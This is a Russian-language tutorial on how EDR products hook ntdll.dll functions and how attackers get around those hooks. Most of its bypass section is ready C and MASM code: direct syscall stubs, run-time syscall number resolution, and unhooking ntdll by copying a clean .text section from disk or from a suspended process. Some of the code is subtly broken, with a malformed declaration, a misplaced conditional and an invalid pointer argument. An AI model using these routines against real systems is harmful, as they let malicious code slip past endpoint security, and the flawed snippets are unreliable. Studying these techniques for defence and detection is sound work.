
Из всех компонентов, входящих в состав современных EDR, наиболее широко используемыми являются DLL, отвечающие за перехват функций. Эти DLL предоставляют большой объем важной информации, связанной с выполнением кода, такой как параметры, передаваемые интересующей функции, и возвращаемые ею значения.

Сегодня вендоры используют эти данные в основном для дополнения других, более надежных источников информации. Тем не менее, перехват функций остается важным компонентом EDR.

## Как работает перехват функций

Этот код, работающий в пользовательском режиме, который обычно использует Win32 API во время выполнения для выполнения определенных функций на хосте. Однако во многих случаях функциональность, предоставляемая через Win32, не может быть полностью завершена в пользовательском режиме. Некоторые действия, такие как управление памятью и объектами, входят в обязанность ядра.

Для передачи управления ядру 64-разрядные (x64) системы используют инструкцию syscall. Но вместо реализации инструкций syscall в каждой функции, которой необходимо взаимодействовать с ядром, Windows предоставляет их через функции в ntdll.dll.

Пример работы:
![](../z.%20Images/{98689057-ADCF-4FAA-ADA6-8F7B398B6F36}.png)

Microsoft Detours — одна из наиболее часто используемых библиотек для реализации хуков функций. Detours заменяет первые несколько инструкций в перехватываемой функции инструкцией безусловного JMP, которая перенаправит выполнение в функцию, определенную разработчиком. Эта функция выполняет действия, заданные разработчиком, такие как логирование параметров, переданных целевой функции. Затем она передает выполнение другой функции, которая исполняет целевую функцию и содержит инструкции, которые изначально были перезаписаны.

Пример:
![](../z.%20Images/{6D07ABAA-4816-4D14-9F0A-2D76C4F983AD}.png)


## Обход перехвата функций

Атакующие могут использовать множество методов для обхода перехвата функций, и все они в целом сводятся к одной из следующих техник:
- Выполнение прямых системных вызовов (Direct Syscalls) для выполнения инструкций немодифицированной заглушки syscall;
- Ремаппинг ntdll.dll для получения неперехваченных указателей функций или перезаписи перехваченной ntdll.dll, отображенной в процессе в данный момент;
- Блокировка загрузки сторонних (не принадлежащих Microsoft) DLL в процесс для предотвращения размещения перенаправлений перехватывающей DLL EDR-системы.

### Выполнение прямых системных вызовов

Наиболее часто злоупотребляемой техникой обхода хуков, установленных на функции ntdll.dll, является выполнение прямых системных вызовов.

Пример:
``` masm
NtAllocateVirtualMemory PROC
	mov r10, rcx
	mov eax, 0018h
	syscall
	ret
NtAllocateVirtualMemory ENDP
```

Использование:
``` C
EXTERN_C NTSTATUS NtAllocateVirtualMemory
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	ULONG ZeroBits,
	PULONG RegionSize,
	ULONG AllocationType,
	ULONG Protect);

#include "syscall.h"

void wmain() {
	LPVOID lpAllocationStart = NULL;
	
	NtAllocateVirtualMemory(GetCurrentProcess(),
		&lpAllocationStart,
		0,
		(PULONG)0x1000,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
}
```

Одной из основных проблем этой техники является то, что Microsoft часто меняет номера системных вызовов, поэтому любой инструментарий, в котором захардкожены эти номера, может работать только в определенных сборках Windows. Например, номер системного вызова для ntdll!NtCreateThreadEx() в сборке 1909 для Windows 10 равен 0xBD. В сборке 20H1 (следующем релизе) он равен 0xC1.


### Динамическое разрешение номеров системных вызовов

Исследователь @modexpblog опубликовал пост под названием «Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams». В нем описывалась другая техника обхода хуков функций: динамическое разрешение номеров системных вызовов во время выполнения, что избавило атакующих от необходимости жестко прописывать значения для каждой сборки Windows.

Эта техника использует следующий алгоритм для создания словаря имен функций и номеров системных вызовов:
1. Получить хэндл к отображенной в текущем процессе ntdll.dll;
2. Перечислить все экспортируемые функции, начинающиеся с Zw, чтобы идентифицировать системные вызовы. Обратите внимание, что функции с префиксом Nt (которые встречаются чаще) работают аналогично при вызове из пользовательского режима. Решение использовать версию с Zw в данном случае выглядит произвольным;
3. Сохранить имена экспортируемых функций и связанные с ними относительные виртуальные адреса (RVA);
4. Отсортировать словарь по относительным виртуальным адресам;
5. Определить номер системного вызова функции как ее индекс в словаре после сортировки. Используя эту технику, мы можем собирать номера системных вызовов во время выполнения, вставлять их в заглушку в соответствующем месте, а затем вызывать целевые функции так же, как и при статически закодированном методе.


### Ремаппинг ntdll.dll

Другой распространенной техникой, используемой для обхода хуков функций в пользовательском режиме, является загрузка новой копии ntdll.dll в процесс, перезапись существующей перехваченной версии содержимым свежезагруженного файла и последующий вызов нужных функций. Эта стратегия работает, потому что заново загруженная ntdll.dll не содержит хуков, реализованных в копии, загруженной ранее. Таким образом, когда она перезаписывает «загрязненную» версию, она эффективно вычищает все хуки, установленные EDR.

``` C
int wmain()
{
    HMODULE hOldNtdll = NULL;
    MODULEINFO info = {};
    LPVOID lpBaseAddress = NULL;
    HANDLE hNewNtdll = NULL;
    HANDLE hFileMapping = NULL;
    LPVOID lpFileData = NULL;
    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS64 pNtHeader = NULL;
    hOldNtdll = GetModuleHandleW(L"ntdll");
    
    if (!GetModuleInformation(
        GetCurrentProcess(),
        hOldNtdll,
        &info,
        sizeof(MODULEINFO)))
    lpBaseAddress = info.lpBaseOfDll;
    
    hNewNtdll = CreateFileW(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
        
    hFileMapping = CreateFileMappingW(
        hNewNtdll,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0, 0, NULL);
        
    lpFileData = MapViewOfFile(
        hFileMapping,
        FILE_MAP_READ,
        0, 0, 0);
        
    pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
    pNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpBaseAddress + pDosHeader->e_lfanew);
    
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER pSection =
            (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(pNtHeader) +
            ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        
        if (!strcmp((PCHAR)pSection->Name, ".text"))
        {
            DWORD dwOldProtection = 0;
            VirtualProtect(
                (LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
                pSection->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &dwOldProtection);
            
            memcpy(
                (LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
                (LPVOID)((ULONG_PTR)lpFileData + pSection->VirtualAddress),
                pSection->Misc.VirtualSize);
            
            VirtualProtect(
                (LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
                pSection->Misc.VirtualSize,
                dwOldProtection,
                &dwOldProtection);
            break;
        }
    }
    // --snip-
}
```

Хотя чтение ntdll.dll с диска кажется простым, оно связано с потенциальным компромиссом. Это обусловлено тем, что загрузка ntdll.dll в один процесс несколько раз является нетипичным поведением.

Чтобы избежать обнаружения на основе этой аномалии, вы можете решить запустить новый процесс в приостановленном состоянии (suspended state), получить хэндл к немодифицированной ntdll.dll.

``` C
int wmain() {
    LPVOID pNtdll = nullptr;
    MODULEINFO mi;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    
    GetModuleInformation(GetCurrentProcess(),
        GetModuleHandleW(L"ntdll.dll"),
        &mi, sizeof(MODULEINFO));
        
    PIMAGE_DOS_HEADER hooked_dos = (PIMAGE_DOS_HEADER)mi.lpBaseOfDll;
    PIMAGE_NT_HEADERS hooked_nt =
        (PIMAGE_NT_HEADERS)((ULONG_PTR)mi.lpBaseOfDll + hooked_dos->e_lfanew);
    
    CreateProcessW(L"C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, TRUE, CREATE_SUSPENDED,
        NULL, NULL, &si, &pi);
        
    pNtdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    
    ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll,
        pNtdll, mi.SizeOfImage, nullptr);
        
    PIMAGE_DOS_HEADER fresh_dos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS fresh_nt =
        (PIMAGE_NT_HEADERS)((ULONG_PTR)pNtdll + fresh_dos->e_lfanew);
        
    for (WORD i = 0; i < hooked_nt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hooked_section =
            (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(hooked_nt) +
            ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            
        if (!strcmp((PCHAR)hooked_section->Name, ".text")) {
            DWORD oldProtect = 0;
            LPVOID hooked_text_section = (LPVOID)((ULONG_PTR)mi.lpBaseOfDll +
                (DWORD_PTR)hooked_section->VirtualAddress);
            LPVOID fresh_text_section = (LPVOID)((ULONG_PTR)pNtdll +
                (DWORD_PTR)hooked_section->VirtualAddress);
            
            VirtualProtect(hooked_text_section,
                hooked_section->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect);
            
            RtlCopyMemory(
                hooked_text_section,
                fresh_text_section,
                hooked_section->Misc.VirtualSize);
            
            VirtualProtect(hooked_text_section,
                hooked_section->Misc.VirtualSize,
                oldProtect,
                &oldProtect);
        }
    }
    
    TerminateProcess(pi.hProcess, 0);
    // --snip-
    return 0;
}
```